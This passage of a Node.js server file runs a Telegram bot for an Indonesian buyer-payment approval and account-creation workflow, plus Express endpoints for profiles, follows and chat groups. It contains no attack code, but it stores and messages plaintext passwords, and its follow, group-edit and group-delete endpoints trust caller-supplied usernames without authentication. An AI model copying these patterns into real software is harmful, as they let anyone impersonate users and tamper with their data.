      `⚠️ Kamu masih punya setoran yang belum selesai.\n` +
      `Selesaikan dulu atau tunggu 30 menit untuk auto-cancel.`
    );
  }

  const buttons = allowedRoles.map(role => ([{
    text: ROLE_LABELS[role] || role,
    callback_data: `sbr:${role}:${buyerUsername}:${sellerId}`,
  }]));
  buttons.push([{ text: "❌ Batal", callback_data: `sbr:cancel:${sellerId}` }]);

  try {
    const sent = await bot.sendMessage(
      chatId,
      `🛒 *SETORAN BUYER*\n\n` +
      `👤 Seller: @${sellerUsername} (${sellerRole.toUpperCase()})\n` +
      `🎯 Buyer: *${buyerUsername}*\n\n` +
      `Pilih role untuk buyer:`,
      { parse_mode: "Markdown", reply_markup: { inline_keyboard: buttons } }
    );

    pendingStoranBuyer[sellerId] = {
      step: "PILIH_ROLE",
      buyerUsername,
      sellerId,
      sellerUsername,
      sellerRole,
      chatId,
      messageId: sent.message_id,
      createdAt: Date.now(),
    };

    logSuccess(`[STORAN-BUYER] ${sellerUsername} (${sellerRole}) → buyer ${buyerUsername}`);
  } catch (e) {
    logError("[STORAN-BUYER] Gagal kirim panel:", e.message);
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// 2. CALLBACK HANDLER — semua sbr:*
// ═══════════════════════════════════════════════════════════════════════════════
bot.on("callback_query", async (query) => {
  const data = query.data || "";

  if (!data.startsWith("sbr")) return;

  const userId = query.from.id;
  const chatId = query.message?.chat?.id;

  try {
    // ═══ CANCEL ═══
    if (data.startsWith("sbr:cancel:")) {
      const sellerId = parseInt(data.split(":")[2]);
      if (sellerId !== userId) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Ini bukan punyamu.", show_alert: true });
      }
      delete pendingStoranBuyer[userId];
      await bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
      return bot.answerCallbackQuery(query.id, { text: "Dibatalkan" });
    }

    // ═══ PILIH ROLE ═══
    if (data.startsWith("sbr:")) {
      const parts = data.split(":");
      const role = parts[1];
      const buyerUsername = parts[2];
      const sellerId = parseInt(parts[3]);

      if (sellerId !== userId) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Ini bukan punyamu.", show_alert: true });
      }

      const state = pendingStoranBuyer[userId];
      if (!state || state.step !== "PILIH_ROLE") {
        return bot.answerCallbackQuery(query.id, { text: "❌ Session expired.", show_alert: true });
      }

      const allowedRoles = getAllowedBuyerRoles(state.sellerRole);
      if (!allowedRoles.includes(role)) {
        return bot.answerCallbackQuery(query.id, {
          text: `❌ Role ${role.toUpperCase()} tidak diizinkan.`,
          show_alert: true,
        });
      }

      state.role = role;
      state.step = "KIRIM_BUKTI_BUYER";
      pendingStoranBuyer[userId] = state;

      await bot.editMessageText(
        `✅ Role: *${role.toUpperCase()}*\n\n` +
        `📸 Kirim *foto bukti transaksi buyer* (transfer dari buyer ke kamu).`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown",
        }
      );

      return bot.answerCallbackQuery(query.id, { text: `✅ ${role.toUpperCase()} dipilih` });
    }

    // ═══ ACC ═══
    if (data.startsWith("sbr_acc:")) {
      const role = getTelegramRole(userId);
      if (!["god", "developer", "owner"].includes(role)) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Hanya Owner/Developer yang bisa ACC.", show_alert: true });
      }

      const setoranId = data.split(":")[1];

      if (sbrLocks.has(setoranId)) {
        return bot.answerCallbackQuery(query.id, { text: "⏳ Sedang diproses...", show_alert: true });
      }
      sbrLocks.add(setoranId);

      try {
        const list = loadBuyerSetoran();
        const idx = list.findIndex(s => s.id === setoranId);
        if (idx === -1) {
          return bot.answerCallbackQuery(query.id, { text: "❌ Setoran tidak ditemukan.", show_alert: true });
        }

        const setoran = list[idx];
        if (setoran.status !== "pending") {
          return bot.answerCallbackQuery(query.id, { text: `❌ Sudah ${setoran.status}.`, show_alert: true });
        }

        const db = loadDatabase();
        if (db.find(u => u.username.toLowerCase() === setoran.buyerUsername.toLowerCase())) {
          return bot.answerCallbackQuery(query.id, { text: "❌ Username buyer sudah terdaftar!", show_alert: true });
        }

        const buyerPassword = generatePassword(10);
        const expired = new Date();
        expired.setDate(expired.getDate() + BUYER_DEFAULT_DURATION_DAYS);

        setoran.status = "approved";
        setoran.processedAt = new Date().toISOString();
        setoran.processedBy = userId;
        setoran.buyerPassword = buyerPassword;
        setoran.buyerExpiredDate = expired.toISOString().split("T")[0];
        list[idx] = setoran;
        saveBuyerSetoran(list);

        const sellerMsg =
          `✅ *SETORAN BUYER DISETUJUI!*\n\n` +
          `🆔 \`${setoran.id}\`\n` +
          `👤 *Buyer:* ${setoran.buyerUsername}\n` +
          `🎭 *Role:* ${setoran.role.toUpperCase()}\n` +
          `💰 Rp${setoran.amount.toLocaleString("id-ID")}\n\n` +
          `📋 *Detail Akun Buyer:*\n` +
          `👤 Username: \`${setoran.buyerUsername}\`\n` +
          `🔑 Password: \`${buyerPassword}\`\n` +
          `⏳ Expired: ${setoran.buyerExpiredDate}\n\n` +
          `🔗 *Link Group:*\n${BUYER_GROUP_LINK}\n\n` +
          `📌 *INSTRUKSI PENTING:*\n` +
          `1. Forward detail akun + link ke buyer\n` +
          `2. Buyer WAJIB pakai username Telegram: *@${setoran.buyerUsername}*\n` +
          `   _(kalau buyer tidak punya username, akun tidak akan auto-terdaftar)_\n` +
          `3. Buyer join group via link di atas\n` +
          `4. Bot akan OTOMATIS daftarkan buyer saat join`;

        await bot.sendMessage(setoran.sellerId, sellerMsg, { parse_mode: "Markdown" })
          .catch(e => logError("[STORAN-BUYER] Gagal kirim ke seller:", e.message));

        await bot.editMessageText(
          `✅ *SETORAN DISETUJUI*\n\n🆔 \`${setoran.id}\`\n👤 ${setoran.buyerUsername}\n🎭 ${setoran.role.toUpperCase()}\n\n` +
          `Kredensial sudah dikirim ke seller.`,
          { chat_id: chatId, message_id: query.message.message_id, parse_mode: "Markdown" }
        ).catch(() => {});

        saveApprovedBuyer(setoran.buyerUsername, BUYER_GROUP_LINK, {
          username: setoran.buyerUsername,
          password: buyerPassword,
          role: setoran.role,
          expiredDate: setoran.buyerExpiredDate,
          createdBy: setoran.sellerId,
          creatorName: setoran.sellerUsername,
          creatorRole: setoran.sellerRole || "seller",
          setoranId: setoran.id,
        });

        return bot.answerCallbackQuery(query.id, { text: "✅ Buyer siap join grup" });
      } finally {
        sbrLocks.delete(setoranId);
      }
    }

    // ═══ REJECT ═══
    if (data.startsWith("sbr_reject:")) {
      const role = getTelegramRole(userId);
      if (!["god", "developer", "owner"].includes(role)) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Hanya Owner/Developer yang bisa tolak.", show_alert: true });
      }

      const setoranId = data.split(":")[1];

      if (sbrLocks.has(setoranId)) {
        return bot.answerCallbackQuery(query.id, { text: "⏳ Sedang diproses...", show_alert: true });
      }
      sbrLocks.add(setoranId);

      try {
        const list = loadBuyerSetoran();
        const idx = list.findIndex(s => s.id === setoranId);
        if (idx === -1) {
          return bot.answerCallbackQuery(query.id, { text: "❌ Setoran tidak ditemukan.", show_alert: true });
        }

        const setoran = list[idx];
        if (setoran.status !== "pending") {
          return bot.answerCallbackQuery(query.id, { text: `❌ Sudah ${setoran.status}.`, show_alert: true });
        }

        setoran.status = "rejected";
        setoran.processedAt = new Date().toISOString();
        setoran.processedBy = userId;
        list[idx] = setoran;
        saveBuyerSetoran(list);

        await bot.sendMessage(setoran.sellerId,
          `❌ *SETORAN BUYER DITOLAK*\n\n🆔 \`${setoran.id}\`\n👤 ${setoran.buyerUsername}\n\n` +
          `Silakan hubungi admin untuk info lebih lanjut.`,
          { parse_mode: "Markdown" }
        ).catch(() => {});

        await bot.editMessageText(
          `❌ *SETORAN DITOLAK*\n\n🆔 \`${setoran.id}\``,
          { chat_id: chatId, message_id: query.message.message_id, parse_mode: "Markdown" }
        ).catch(() => {});

        return bot.answerCallbackQuery(query.id, { text: "❌ Setoran ditolak" });
      } finally {
        sbrLocks.delete(setoranId);
      }
    }
  } catch (err) {
    logError("[STORAN-BUYER] Callback error:", err.message);
    try { await bot.answerCallbackQuery(query.id, { text: "❌ Error sistem", show_alert: true }); } catch {}
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// 3. PHOTO HANDLER — 1 handler dengan step check
// ═══════════════════════════════════════════════════════════════════════════════
bot.on("photo", async (msg) => {
  const sellerId = msg.from.id;
  const chatId = msg.chat.id;
  const state = pendingStoranBuyer[sellerId];

  if (!state) return;

  // ─── STEP 1: BUKTI BUYER ───
  if (state.step === "KIRIM_BUKTI_BUYER") {
    try {
      const photo = msg.photo[msg.photo.length - 1];
      const file = await bot.getFile(photo.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;

      if (!fs.existsSync(BUKTI_DIR)) fs.mkdirSync(BUKTI_DIR, { recursive: true });
      const fileName = `buyer_${Date.now()}_${sellerId}.jpg`;
      const filePath = path.join(BUKTI_DIR, fileName);

      const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
      fs.writeFileSync(filePath, Buffer.from(response.data));

      const buktiUrl = `${HOST}/uploads/bukti/${fileName}`;

      state.buktiBuyer = buktiUrl;
      state.buktiBuyerLocal = filePath;
      state.step = "BAYAR_QRIS";
      pendingStoranBuyer[sellerId] = state;

      const qrisCaption = buildRichCaption(
        `👤 *Buyer:* ${state.buyerUsername}\n` +
        `🎭 *Role:* ${state.role.toUpperCase()}\n` +
        `💰 *Biaya:* Rp${SETORAN_BUYER_PRICE.toLocaleString("id-ID")}\n\n` +
        `📌 *Cara Pembayaran:*\n` +
        `1. Scan QRIS di atas\n` +
        `2. Transfer tepat *Rp${SETORAN_BUYER_PRICE.toLocaleString("id-ID")}*\n` +
        `3. Screenshot bukti transfer\n` +
        `4. Kirim screenshot ke sini\n\n` +
        `⚠️ Nominal harus sama persis.\n⏱️ Batas waktu: 15 menit.`,
        {
          title: "💳 PEMBAYARAN SETORAN BUYER",
          subtitle: "Silakan scan QRIS",
          footer: "© X-FORCE Project",
          parseMode: "Markdown",
        }
      );

      await bot.sendPhoto(chatId, BUYER_QRIS_IMAGE, {
        caption: qrisCaption,
        parse_mode: "Markdown",
      });

      logSuccess(`[STORAN-BUYER] ${state.sellerUsername} → bukti buyer OK, kirim QRIS`);
    } catch (err) {
      logError("[STORAN-BUYER] Error bukti buyer:", err.message);
      bot.sendMessage(chatId, "❌ Gagal proses foto. Coba kirim ulang.");
    }
    return;
  }

  // ─── STEP 2: BUKTI BAYAR QRIS ───
  if (state.step === "BAYAR_QRIS") {
    try {
      const photo = msg.photo[msg.photo.length - 1];
      const file = await bot.getFile(photo.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;

      if (!fs.existsSync(BUKTI_DIR)) fs.mkdirSync(BUKTI_DIR, { recursive: true });
      const fileName = `pay_${Date.now()}_${sellerId}.jpg`;
      const filePath = path.join(BUKTI_DIR, fileName);

      const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
      fs.writeFileSync(filePath, Buffer.from(response.data));

      const buktiBayarUrl = `${HOST}/uploads/bukti/${fileName}`;

      state.buktiBayar = buktiBayarUrl;
      state.buktiBayarLocal = filePath;
      state.step = "WAITING_ACC";
      state.setoranId = genBuyerSetoranId();
      pendingStoranBuyer[sellerId] = state;

      const setoranData = {
        id: state.setoranId,
        sellerId: state.sellerId,
        sellerUsername: state.sellerUsername,
        sellerRole: state.sellerRole,
        buyerUsername: state.buyerUsername,
        role: state.role,
        buktiBuyerUrl: state.buktiBuyer,
        buktiBayarUrl: buktiBayarUrl,
        amount: SETORAN_BUYER_PRICE,
        status: "pending",
        createdAt: new Date().toISOString(),
        processedAt: null,
        processedBy: null,
      };

      const list = loadBuyerSetoran();
      list.push(setoranData);
      saveBuyerSetoran(list);

      await bot.sendMessage(chatId,
        `✅ *BUKTI DITERIMA!*\n\n` +
        `🆔 \`${state.setoranId}\`\n` +
        `👤 ${state.buyerUsername}\n` +
        `🎭 ${state.role.toUpperCase()}\n` +
        `💰 Rp${SETORAN_BUYER_PRICE.toLocaleString("id-ID")}\n\n` +
        `⏳ Mohon tunggu ACC dari Owner/Developer.`,
        { parse_mode: "Markdown" }
      );

      const config = loadTelegramConfig();
      const ownerIds = [...new Set([...config.ownerUser, ...config.developerUser])];

      const accCaption = buildRichCaption(
        `🆔 *Setoran ID:* \`${state.setoranId}\`\n\n` +
        `👤 *Seller:* @${state.sellerUsername} (${state.sellerRole.toUpperCase()})\n` +
        `🎯 *Buyer:* ${state.buyerUsername}\n` +
        `🎭 *Role:* ${state.role.toUpperCase()}\n` +
        `💰 Rp${SETORAN_BUYER_PRICE.toLocaleString("id-ID")}\n` +
        `📅 ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}\n\n` +
        `📸 [Bukti buyer→seller](${state.buktiBuyer})\n` +
        `📸 [Bukti seller→QRIS](${buktiBayarUrl})\n\n` +
        `⚡ Verifikasi dulu sebelum ACC!`,
        {
          title: "🛒 SETORAN BUYER BARU",
          subtitle: "Mohon verifikasi & ACC",
          footer: "ACC: tombol di bawah",
          parseMode: "Markdown",
        }
      );

      const accKeyboard = {
        inline_keyboard: [[
          { text: "✅ ACC", callback_data: `sbr_acc:${state.setoranId}` },
          { text: "❌ Tolak", callback_data: `sbr_reject:${state.setoranId}` },
        ]],
      };

      let sentToOwner = false;
      for (const ownerId of ownerIds) {
        try {
          await bot.sendMessage(ownerId, accCaption, {
            parse_mode: "Markdown",
            reply_markup: accKeyboard,
          });
          sentToOwner = true;
        } catch (e) {
          logWarning(`[STORAN-BUYER] Gagal DM owner ${ownerId}: ${e.message}`);
        }
      }

      if (!sentToOwner) {
        logWarning(`[STORAN-BUYER] Semua DM owner gagal, fallback ke grup`);
        await bot.sendMessage(ID_GROUP, accCaption, {
          parse_mode: "Markdown",
          reply_markup: accKeyboard,
        }).catch(e => logError("[STORAN-BUYER] Fallback grup gagal:", e.message));
      }

      logSuccess(`[STORAN-BUYER] Setoran ${state.setoranId} → ${ownerIds.length} owner/dev (sentToOwner: ${sentToOwner})`);
    } catch (err) {
      logError("[STORAN-BUYER] Error bukti bayar:", err.message);
      bot.sendMessage(chatId, "❌ Gagal proses bukti transfer. Coba kirim ulang.");
    }
    return;
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// 4. AUTO-ADD BUYER SAAT JOIN GRUP
// ═══════════════════════════════════════════════════════════════════════════════
bot.on("new_chat_members", async (msg) => {
  const chatId = msg.chat.id;
  const newMembers = msg.new_chat_members || [];

  if (chatId !== ID_GROUP) return;

  const approved = loadApprovedBuyers();

  for (const member of newMembers) {
    if (member.is_bot) continue;

    const memberUsername = (member.username || "").toLowerCase();
    if (!memberUsername) {
      logWarning(`[STORAN-BUYER] Member baru tanpa username, skip. ID: ${member.id}`);
      continue;
    }

    const idx = approved.findIndex(
      b => b.username.toLowerCase() === memberUsername && !b.used
    );
    if (idx === -1) continue;

    const buyerInfo = approved[idx];
    const buyerData = buyerInfo.buyerData;

    const db = loadDatabase();
    if (db.find(u => u.username.toLowerCase() === memberUsername)) {
      logWarning(`[STORAN-BUYER] Buyer ${memberUsername} sudah ada di DB, skip`);
      approved[idx].used = true;
      saveApprovedBuyers(approved);
      continue;
    }

    const newBuyerAccount = {
      username: buyerData.username,
      password: buyerData.password,
      role: buyerData.role,
      expiredDate: buyerData.expiredDate,
      isBanned: false,
      createdBy: buyerData.createdBy,
      creatorName: buyerData.creatorName,
      creatorRole: buyerData.creatorRole,
      createdAt: new Date().toISOString(),
      telegramId: member.id,
      telegramUsername: memberUsername,
      fromSetoran: buyerData.setoranId || null,
    };

    db.push(newBuyerAccount);
    saveDatabase(db);

    saveUserLog(buyerData.username, "register", "Buyer Register via Setoran",
      `Auto-added saat join grup | Setoran ID: ${buyerData.setoranId || "-"}`);

    logSuccess(`[STORAN-BUYER] ✅ AUTO-ADD buyer ${buyerData.username} ke DB`);

    await bot.sendMessage(chatId,
      `🎉 *BUYER BARU TERDAFTAR!*\n\n` +
      `👤 @${memberUsername}\n` +
      `🎭 ${buyerData.role.toUpperCase()}\n` +
      `⏳ ${buyerData.expiredDate}\n\n` +
      `✅ Akun otomatis terdaftar!\n📌 Kirim /menu untuk lihat fitur.`,
      { parse_mode: "Markdown" }
    ).catch(() => {});

    try {
      await bot.sendMessage(member.id,
        `✅ *AKUN BUYER AKTIF!*\n\n` +
        `👤 Username: \`${buyerData.username}\`\n` +
        `🔑 Password: \`${buyerData.password}\`\n` +
        `🎭 Role: ${buyerData.role.toUpperCase()}\n` +
        `⏳ Expired: ${buyerData.expiredDate}\n\n` +
        `📌 Login di aplikasi sekarang!\nJangan share password.`,
        { parse_mode: "Markdown" }
      );
    } catch (e) {
      logWarning(`[STORAN-BUYER] Gagal DM buyer ${memberUsername}: ${e.message}`);
    }

    approved[idx].used = true;
    approved[idx].usedAt = new Date().toISOString();
    approved[idx].telegramId = member.id;
    saveApprovedBuyers(approved);

    try {
      await bot.sendMessage(buyerData.createdBy,
        `🎊 *BUYER KAMU SUDAH JOIN!*\n\n` +
        `👤 @${memberUsername}\n` +
        `🎭 ${buyerData.role.toUpperCase()}\n\n` +
        `✅ Akun buyer otomatis terdaftar.`,
        { parse_mode: "Markdown" }
      );
    } catch (e) {
      logWarning(`[STORAN-BUYER] Gagal notif seller: ${e.message}`);
    }
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// 5. COMMAND /listsetoranbuyer
// ═══════════════════════════════════════════════════════════════════════════════
bot.onText(/^\/listsetoranbuyer(?:\s+(\w+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);

  if (!["god", "developer", "owner", "admin"].includes(role)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const filterStatus = (match[1] || "").toLowerCase();
  const list = loadBuyerSetoran();

  let filtered = list;
  if (["pending", "approved", "rejected"].includes(filterStatus)) {
    filtered = list.filter(s => s.status === filterStatus);
  }

  if (filtered.length === 0) {
    return bot.sendMessage(chatId, `📭 Belum ada setoran buyer${filterStatus ? ` (${filterStatus})` : ""}.`);
  }

  let text = `📋 *SETORAN BUYER (${filtered.length})*\n\n`;
  const recent = filtered.slice(-10).reverse();

  recent.forEach((s, i) => {
    const emoji = s.status === "approved" ? "✅" : s.status === "rejected" ? "❌" : "⏳";
    text += `${i + 1}. ${emoji} \`${s.id}\`\n`;
    text += `   👤 @${s.sellerUsername} (${s.sellerRole || "-"})\n`;
    text += `   🎯 ${s.buyerUsername} (${s.role})\n`;
    text += `   💰 Rp${s.amount.toLocaleString("id-ID")}\n`;
    text += `   📅 ${new Date(s.createdAt).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}\n\n`;
  });

  await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

// ═══════════════════════════════════════════════════════════════════════════════
// 6. CLEANUP PENDING STATE + FILE
// ═══════════════════════════════════════════════════════════════════════════════
setInterval(() => {
  const now = Date.now();
  for (const sellerId in pendingStoranBuyer) {
    const state = pendingStoranBuyer[sellerId];
    const age = now - (state.createdAt || now);
    if (age > 30 * 60 * 1000) {
      try {
        if (state.buktiBuyerLocal && fs.existsSync(state.buktiBuyerLocal)) {
          fs.unlinkSync(state.buktiBuyerLocal);
        }
        if (state.buktiBayarLocal && fs.existsSync(state.buktiBayarLocal)) {
          fs.unlinkSync(state.buktiBayarLocal);
        }
      } catch {}

      delete pendingStoranBuyer[sellerId];
      logWarning(`[STORAN-BUYER] Auto-cleanup seller ${sellerId}`);
    }
  }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════════════════════════════════════════
// 7. API ENDPOINT
// ═══════════════════════════════════════════════════════════════════════════════
app.get("/api/buyersetoran", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const list = loadBuyerSetoran();
  const isAdmin = ["owner", "developer", "admin"].includes((user.role || "").toLowerCase());

  const filtered = isAdmin ? list : list.filter(s => s.sellerUsername === user.username);

  res.json({ valid: true, total: filtered.length, data: filtered });
});

logSuccess("[STORAN-BUYER] ✅ Module initialized (FIXED)");

// ═══════════════════════════════════════════════════════════════════════════════
// [END SETORAN BUYER SYSTEM]
// ═══════════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════════
// [+] PROFILE + FOLLOW + GROUP WHATSAPP-STYLE
// ═══════════════════════════════════════════════════════════════════════════════

// ─── Helper: pastikan field following ada ────────────────
function ensureFollowField(user) {
  if (!Array.isArray(user.following)) user.following = [];
  return user;
}

// ─── Helper: detail grup lengkap ─────────────────────────
function getGroupDetail(room) {
  const db = loadDatabase();
  const members = room.members.map(username => {
    const u = db.find(x => x.username === username);
    return {
      username,
      displayName: u?.displayName || username,
      role: (room.admins || []).includes(username) ? "Admin" : "Member",
      profileImageUrl: u?.profileImageUrl || null,
    };
  });

  const allMessages = loadChatMessages();
  const roomMsgs = allMessages.filter(m => m.roomId === room.id && !m.isDeleted);
  const last = roomMsgs.length > 0 ? roomMsgs[roomMsgs.length - 1] : null;

  return {
    id: room.id,
    name: room.name,
    description: room.description || null,
    avatarUrl: room.avatarUrl || null,
    ownerUsername: room.ownerUsername || room.createdBy,
    admins: room.admins || [],
    members,
    memberCount: members.length,
    lastMessage: last?.text || (last?.mediaUrl ? `[${last.type}]` : null),
    lastMessageAt: last?.createdAt || null,
    createdAt: room.createdAt,
  };
}

// ─── Helper: broadcast ke semua member grup ──────────────
function broadcastToGroupMembers(groupId, payload) {
  const rooms = loadChatRooms();
  const room = rooms.find(r => r.id === groupId);
  if (!room) return;

  room.members.forEach(memberUsername => {
    const ws = wsClients[memberUsername];
    if (ws && ws.readyState === 1) {
      try { ws.send(JSON.stringify(payload)); } catch {}
    }
  });
}

// ─── Helper: broadcast update grup ───────────────────────
function broadcastGroupUpdate(groupId, event, extra) {
  broadcastToGroupMembers(groupId, { type: "groupUpdated", event, groupId, ...extra });
}

// ═══════════════════════════════════════════════════════════
// [+] PROFILE ENDPOINTS
// ═══════════════════════════════════════════════════════════

// ─── GET /api/profile/:username?viewer=xxx ───────────────
app.get("/api/profile/:username", (req, res) => {
  try {
    const { username } = req.params;
    const { viewer } = req.query;

    const db = loadDatabase();
    const target = db.find(u => u.username === username);
    if (!target) return res.status(404).json({ success: false, message: "User not found" });

    ensureFollowField(target);

    const followers = db.filter(u =>
      Array.isArray(u.following) && u.following.includes(username)
    ).length;
    const following = target.following.length;

    // Hitung posts dari story
    let posts = 0;
    try {
      const stories = JSON.parse(fs.readFileSync(STORY_FILE, 'utf8') || '[]');
      posts = stories.filter(s => s.username === username).length;
    } catch {}

    const viewerUser = viewer ? db.find(u => u.username === viewer) : null;
    const isFollowing = viewerUser
      ? ensureFollowField(viewerUser).following.includes(username)
      : false;

    return res.json({
      success: true,
      data: {
        username: target.username,
        displayName: target.displayName || target.username,
        role: target.role || "member",
        profileImageUrl: target.profileImageUrl || null,
        bio: target.bio || null,
        followers,
        following,
        posts,
        isFollowing,
        isMe: viewer === username,
      },
    });
  } catch (err) {
    logError("[PROFILE] error:", err.message);
    return res.status(500).json({ success: false, message: err.message });
  }
});

// ─── POST /api/follow ────────────────────────────────────
app.post("/api/follow", express.json(), (req, res) => {
  try {
    const { from, to, action } = req.body;
    if (!from || !to || !action) {
      return res.json({ success: false, message: "Missing fields: from, to, action" });
    }
    if (from === to) {
      return res.json({ success: false, message: "Tidak bisa follow diri sendiri" });
    }
    if (!["follow", "unfollow"].includes(action)) {
      return res.json({ success: false, message: "Action harus 'follow' atau 'unfollow'" });
    }

    const db = loadDatabase();
    const fromUser = db.find(u => u.username === from);
    const toUser = db.find(u => u.username === to);
    if (!fromUser || !toUser) {
      return res.json({ success: false, message: "User not found" });
    }

    ensureFollowField(fromUser);

    if (action === "follow") {
      if (!fromUser.following.includes(to)) fromUser.following.push(to);
    } else {
      fromUser.following = fromUser.following.filter(x => x !== to);
    }

    saveDatabase(db);

    logSuccess(`[FOLLOW] ${from} ${action} ${to}`);
    return res.json({
      success: true,
      isFollowing: action === "follow",
      followingCount: fromUser.following.length,
    });
  } catch (err) {
    logError("[FOLLOW] error:", err.message);
    return res.status(500).json({ success: false, message: err.message });
  }
});

// ─── GET /api/followers/:username ────────────────────────
app.get("/api/followers/:username", (req, res) => {
  try {
    const { username } = req.params;
    const db = loadDatabase();
    const users = db
      .filter(u => Array.isArray(u.following) && u.following.includes(username))
      .map(u => ({
        username: u.username,
        displayName: u.displayName || u.username,
        role: u.role || "member",
        profileImageUrl: u.profileImageUrl || null,
      }));
    return res.json({ success: true, total: users.length, users });
  } catch (err) {
    return res.status(500).json({ success: false, users: [] });
  }
});

// ─── GET /api/following/:username ────────────────────────
app.get("/api/following/:username", (req, res) => {
  try {
    const { username } = req.params;
    const db = loadDatabase();
    const user = db.find(u => u.username === username);
    if (!user) return res.json({ success: true, total: 0, users: [] });

    ensureFollowField(user);
    const users = user.following
      .map(name => db.find(u => u.username === name))
      .filter(Boolean)
      .map(u => ({
        username: u.username,
        displayName: u.displayName || u.username,
        role: u.role || "member",
        profileImageUrl: u.profileImageUrl || null,
      }));
    return res.json({ success: true, total: users.length, users });
  } catch (err) {
    return res.status(500).json({ success: false, users: [] });
  }
});

// ═══════════════════════════════════════════════════════════
// [+] GROUP ENDPOINTS (WHATSAPP-STYLE)
// ═══════════════════════════════════════════════════════════

// ─── GET /api/groups?username=xxx ────────────────────────
app.get("/api/groups", (req, res) => {
  try {
    const { username } = req.query;
    if (!username) return res.json({ success: false, groups: [], message: "username wajib" });

    const rooms = loadChatRooms();
    const myGroups = rooms
      .filter(r => r.type === "group" && r.members.includes(username))
      .map(getGroupDetail)
      .sort((a, b) => new Date(b.lastMessageAt || b.createdAt) - new Date(a.lastMessageAt || a.createdAt));

    return res.json({ success: true, total: myGroups.length, groups: myGroups });
  } catch (err) {
    return res.status(500).json({ success: false, groups: [], error: err.message });
  }
});

// ─── GET /api/groups/:id ─────────────────────────────────
app.get("/api/groups/:id", (req, res) => {
  try {
    const rooms = loadChatRooms();
    const room = rooms.find(r => r.id === req.params.id && r.type === "group");
    if (!room) return res.json({ success: false, message: "Group not found" });
    return res.json({ success: true, group: getGroupDetail(room) });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ─── POST /api/groups/create ("CULIK" MEMBER) ────────────
app.post("/api/groups/create", express.json(), (req, res) => {
  try {
    const { name, owner, members, description } = req.body;

    if (!name || !name.trim()) {
      return res.json({ success: false, message: "Nama grup wajib diisi" });
    }
    if (!owner) {
      return res.json({ success: false, message: "Owner wajib" });
    }
    if (!Array.isArray(members) || members.length === 0) {
      return res.json({ success: false, message: "Pilih minimal 1 anggota" });
    }

    const db = loadDatabase();
    const ownerUser = db.find(u => u.username === owner);
    if (!ownerUser) return res.json({ success: false, message: "Owner not found" });

    // ✅ CULIK: semua user yang dipilih langsung jadi member TANPA approval
    const memberList = [...new Set([owner, ...members])];

    const roomId = `group_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const now = new Date().toISOString();

    const newRoom = {
      id: roomId,
      type: "group",
      name: name.trim(),
      description: description || null,
      avatarUrl: null,
      createdBy: owner,
      ownerUsername: owner,
      members: memberList,
      admins: [owner],
      createdAt: now,
    };

    const rooms = loadChatRooms();
    rooms.push(newRoom);
    saveChatRooms(rooms);

    // System message
    const messages = loadChatMessages();
    messages.push({
      id: `msg_${Date.now()}_sys`,
      roomId,
      senderUsername: "system",
      senderRole: "system",
      type: "system",
      text: `${owner} membuat grup "${name}" dengan ${memberList.length} anggota`,
      createdAt: now,
      isDeleted: false,
    });
    saveChatMessages(messages);

    logSuccess(`[GROUP] ${owner} buat grup "${name}" | ${memberList.length} member`);

    // Notif ke semua member via WS
    broadcastGroupUpdate(roomId, "group_created", { group: getGroupDetail(newRoom) });

    return res.json({ success: true, group: getGroupDetail(newRoom) });
  } catch (err) {
    logError("[GROUP-CREATE] error:", err.message);
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ─── PATCH /api/groups/:id (rename / edit desc) ──────────
app.patch("/api/groups/:id", express.json(), (req, res) => {
  try {
    const { name, description } = req.body;
    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === req.params.id && r.type === "group");
    if (idx === -1) return res.json({ success: false, message: "Not found" });

    if (name && name.trim()) rooms[idx].name = name.trim();
    if (description !== undefined) rooms[idx].description = description;
    saveChatRooms(rooms);

    broadcastGroupUpdate(req.params.id, "group_renamed", { name: rooms[idx].name });

    return res.json({ success: true, group: getGroupDetail(rooms[idx]) });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ─── DELETE /api/groups/:id (OWNER ONLY) ────────────────
app.delete("/api/groups/:id", (req, res) => {
  try {
    const { requester } = req.query;
    const rooms = loadChatRooms();
    const idx = rooms.findIndex(r => r.id === req.params.id && r.type === "group");
    if (idx === -1) return res.json({ success: false, message: "Not found" });

    const room = rooms[idx];
    if (room.ownerUsername !== requester && room.createdBy !== requester) {
      return res.json({ success: false, message: "Hanya owner yang bisa hapus grup" });
    }

    // Notif sebelum hapus
    broadcastGroupUpdate(room.id, "group_deleted", {});

    rooms.splice(idx, 1);
    saveChatRooms(rooms);

    // Hapus semua pesan grup
    let messages = loadChatMessages();
    messages = messages.filter(m => m.roomId !== req.params.id);
    saveChatMessages(messages);

    logSuccess(`[GROUP] ${requester} hapus grup ${room.name}`);
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// ─── POST /api/groups/:id/members (BULK ADD) ────────────
